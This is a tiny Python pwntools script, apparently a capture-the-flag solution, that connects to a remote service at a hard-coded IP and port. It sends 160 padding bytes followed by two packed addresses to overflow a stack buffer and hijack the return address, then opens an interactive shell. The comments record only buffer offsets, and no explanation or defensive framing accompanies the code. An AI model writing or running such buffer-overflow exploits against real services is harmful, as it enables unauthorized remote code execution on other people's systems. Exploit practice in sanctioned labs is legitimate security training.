#!/usr/bin/python

from pwn import *

context.arch = "amd64"
r = remote("124.16.75.117", 51001)
r.sendline(b"a" * 160 + p64(0xF7C732A0) + p64(0x565C3008))

r.interactive()

# ebp-156
# input[152]
#
